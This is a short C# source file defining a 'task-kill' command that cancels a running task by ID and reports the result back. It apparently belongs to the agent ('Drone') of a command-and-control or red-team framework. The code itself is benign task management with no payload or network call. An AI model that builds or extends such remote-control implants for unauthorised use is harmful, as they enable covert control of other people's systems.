using Drone.Models;

namespace Drone.Functions;

public class TaskKill : DroneFunction
{
    public override string Name => "task-kill";
    
    public override void Execute(DroneTask task)
    {
        if (Drone.CancelTask(task.Parameters[0])) Drone.SendTaskComplete(task.TaskId);
        else Drone.SendError(task.TaskId, "Task ID not found.");
    }
}